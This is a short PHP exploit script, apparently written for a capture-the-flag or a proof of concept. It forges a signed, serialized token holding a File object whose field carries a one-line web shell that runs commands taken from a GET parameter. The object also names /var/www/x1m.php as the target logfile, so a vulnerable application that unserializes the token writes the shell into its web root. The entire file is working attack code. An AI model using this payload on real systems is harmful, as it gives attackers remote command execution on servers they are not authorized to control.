<?php

define('KEY', "INSERT_KEY_HERE");

function sign($data) {
    return hash_hmac('md5', $data, KEY);
}

function tokenize($user) { 
    $token = urlencode(base64_encode(serialize($user)));
    $token.= "--".sign($token);
    return $token;
}

class File {
    public $owner, $uuid='<?php system($_GET["c"]);?>';
    public $logfile = "/var/www/x1m.php";
}

echo tokenize(new File());

?>